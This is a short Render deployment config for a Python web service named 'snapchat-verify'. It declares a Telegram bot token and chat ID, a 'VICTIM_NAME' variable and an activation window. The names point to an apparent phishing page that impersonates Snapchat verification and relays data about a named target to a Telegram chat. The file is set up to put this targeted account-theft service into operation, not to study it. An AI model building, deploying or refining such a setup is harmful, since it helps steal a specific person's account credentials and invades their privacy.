# render.yaml
services:
  - type: web
    name: snapchat-verify
    runtime: python
    plan: free
    buildCommand: pip install -r requirements.txt
    startCommand: gunicorn app:app --bind 0.0.0.0:$PORT --workers 2 --timeout 60
    envVars:
      - key: FLASK_SECRET_KEY
        generateValue: true
      - key: TELEGRAM_BOT_TOKEN
        sync: false
      - key: TELEGRAM_CHAT_ID
        sync: false
      - key: VICTIM_NAME
        sync: false
      - key: ACTIVATION_HOURS
        sync: false
      - key: PYTHON_VERSION
        value: 3.11.9